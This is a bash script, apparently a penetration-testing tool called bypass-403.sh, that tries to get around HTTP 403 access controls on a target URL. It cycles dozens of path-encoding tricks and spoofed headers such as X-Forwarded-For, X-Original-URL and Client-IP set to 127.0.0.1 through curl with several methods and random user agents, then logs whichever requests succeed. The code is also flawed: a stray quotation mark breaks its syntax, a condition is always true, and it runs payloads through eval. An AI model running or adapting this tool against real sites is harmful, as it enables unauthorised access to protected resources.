#!/bin/bash
# Refactored and payloads added by Nicholas Ferreira (github.com/Nickguitar)


# Definir colores
GREEN_BOLD='\033[1;92m'
GRAY='\033[90m'
NC='\033[0m' 
BLUE='\e[1;34m'
RED='\e[1;31m'



random_user_agent() {
  shuf -n 1 -e \
    "dummy" \
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.3; rv:124.0) Gecko/20100101 Firefox/124.0" \
    "$RANDOM" \
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1" \
    " " \
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.106 Safari/537.36 Edg/123.0.2420.65"
}

get_ip() {
    local url="$1"
    local host
    host=$(echo "$url" | awk -F[/:] '{print $4}')
    
    if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "$host"
    else
        getent hosts "$host" | head -n 1 | awk '{print $1}'
    fi
}

IP=$(get_ip $1)

if [[ -z $IP ]]; then
    echo -e "${RED}Error: Unable to resolve IP address for $1${NC}"
fi

echo "" > /tmp/bypass-403.txt


echo "./bypass-403.sh https://example.com path"
echo " "

read -r -d '' paths <<EOF
$1/$2
$1/%2e/$2
$1/$2/.
$1//$2//
$1/./$2/./
$1/$2%20
$1/$2%09
$1/$2?
$1/$2.html
$1/$2/?anything
$1/$2#
$1/$2/*
$1/$2.php
$1/$2.json
$1/%252e**/$2
"$1/$2..;/"
" $1/$2;/"
$1/$(tr [:lower:] [:upper:] <<< $2)
-X TRACE $1/$2
-H "Base-Url: 127.0.0.1" $1/$2
-H "Base-Url: $IP" $1/$2
-H "Client-IP: 127.0.0.1" $1/$2
-H "Client-IP: $IP" $1/$2
-H "Content-Length:0" -X POST $1/$2
-H "Http-Url: 127.0.0.1" $1/$2
-H "Http-Url: $IP" $1/$2
-H "Http-Url: $1" $1/$2
-H "Proxy-Host: 127.0.0.1" $1/$2
-H "Proxy-Url: 127.0.0.1" $1/$2
-H "Real-Ip: 127.0.0.1" $1/$2
-H "Real-Ip: $IP" $1/$2
-H "Redirect: 127.0.0.1" $1/$2
-H "Referer: $IP" $1/$2
-H "Referer: 127.0.0.1" $1/$2
-H "Referer: $1" $1/$2
-H "Request-Uri: 127.0.0.1" $1/$2
-H "Request-Uri: $IP" $1/$2
-H "Request-Uri: $1" $1/$2
-H "Uri: 127.0.0.1" $1/$2
-H "Uri: $1" $1/$2
-H "Url: 127.0.0.1" $1/$2
-H "Url: $IP" $1/$2
-H "Url: $1" $1/$2
-H "X-Client-IP: 127.0.0.1" $1/$2
-H "X-Client-IP: $IP" $1/$2
-H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-H "X-Custom-IP-Authorization: $IP" $1/$2
-H "X-Forward-For: 127.0.0.1" $1/$2
-H "X-Forward-For: $IP" $1/$2
-H "X-Forwarded-By: 127.0.0.1" $1/$2
-H "X-Forwarded-By: $IP" $1/$2
-H "X-Forwarded-For-Original: 127.0.0.1" $1/$2
-H "X-Forwarded-For-Original: $IP" $1/$2
-H "X-Forwarded-For: 127.0.0.1" $1/$2
-H "X-Forwarded-For: $IP" $1/$2
-H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-H "X-Forwarded-For: http://127.0.0.1" $1/$2
-H "X-Forwarded-For: $IP" $1/$2
-H "X-Forwarded-For: $1" $1/$2
-H "X-Forwarded-Host: 127.0.0.1" $1/$2
-H "X-Forwarded-Host: $IP" $1/$2
-H "X-Forwarded-Port: 443" $1/$2
-H "X-Forwarded-Port: 4443" $1/$2
-H "X-Forwarded-Port: 80" $1/$2
-H "X-Forwarded-Port: 8080" $1/$2
-H "X-Forwarded-Port: 8443" $1/$2
-H "X-Forwarded-Scheme: http" $1/$2
-H "X-Forwarded-Scheme: https" $1/$2
-H "X-Forwarded-Server: 127.0.0.1" $1/$2
-H "X-Forwarded-Server: $IP" $1/$2
-H "X-Forwarded-Server: $1" $1/$2
-H "X-Forwarded: 127.0.0.1" $1/$2
-H "X-Forwarded: $IP" $1/$2
-H "X-Forwarded: $1" $1/$2
-H "X-Forwarder-For: 127.0.0.1" $1/$2
-H "X-Forwarder-For: $IP" $1/$2
-H "X-Forwarder-For: $1" $1/$2
-H "X-Host: 127.0.0.1" $1/$2
-H "X-Host: 1.2.3.4" $1/$2
-H "X-Host: $IP" $1/$2
-H "Host: 127.0.0.1" $1/$2
-H "Host: 1.2.3.4" $1/$2
-H "Host: $IP" $1/$2
-H "X-Http-Destinationurl: 127.0.0.1" $1/$2
-H "X-Http-Host-Override: 127.0.0.1" $1/$2
-H "X-Original-Remote-Addr: 127.0.0.1" $1/$2
-H "X-Original-Remote-Addr: $IP" $1/$2
-H "X-Original-URL: $1" $1/$2
-H "X-Original-Url: 127.0.0.1" $1/$2
-H "X-Original-Url: $IP" $1/$2
-H "X-Originating-IP: 127.0.0.1" $1/$2
-H "X-Originating-IP: $IP" $1/$2
-H "X-Proxy-Url: 127.0.0.1" $1/$2
-H "X-Proxy-Url: $IP" $1/$2
-H "X-Real-Ip: 127.0.0.1" $1/$2
-H "X-Real-Ip: $IP" $1/$2
-H "X-Remote-Addr: 127.0.0.1" $1/$2
-H "X-Remote-Addr: $IP" $1/$2
-H "X-Remote-IP: 127.0.0.1" $1/$2
-H "X-Remote-IP: $IP" $1/$2
-H "X-Rewrite-Url: 127.0.0.1" $1/$2
-H "X-Rewrite-Url: $IP" $1/$2
-H "X-True-IP: 127.0.0.1" $1/$2
-H "X-True-IP: $IP" $1/$2
-H "X-rewrite-url: $1/$2" $1/$2
EOF

IFS=$'\n'
for method in GET POST OPTIONS TRACE; do
  for payload in ${paths[@]}; do
      AGENT=$(random_user_agent)
      cmd="curl -A \"$AGENT\" -X $method -Lks -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" $payload"
      result=$(eval $cmd)
      http_code=$(echo $result | cut -d ',' -f1)
      

      
      if [[ $http_code =~ ^[23][0-9]{2}$ ]]; then
          # 2xx o 3xx in green
          echo -e "${GREEN_BOLD}${result} $method ${payload}${NC}"
          echo "curl -Lks -A \"$AGENT\" -X $method $payload" >> /tmp/bypass-403.txt
          echo "" >> /tmp/bypass-403.txt
      else
          # others in gray
          echo -e "${GRAY}${result} $method ${payload}${NC}"
      fi
  done
done

echo
echo -e "${BLUE}[+] Successfully commands:${NC}"
echo -e "${BLUE}--------------------------${NC}"
cat /tmp/bypass-403.txt
"



#Look for entry in wayback machine except for HackTheBox and others
if ! [[ $1 =~ .htb ]] || ! [[ $IP =~ "172.17" ]] || ! [[ $IP =~ "10." ]] || ! [[ $IP =~ "192.168." ]]; then
  echo
  echo "Way back machine:"
  curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
fi

rm -f /tmp/bypass-403.txt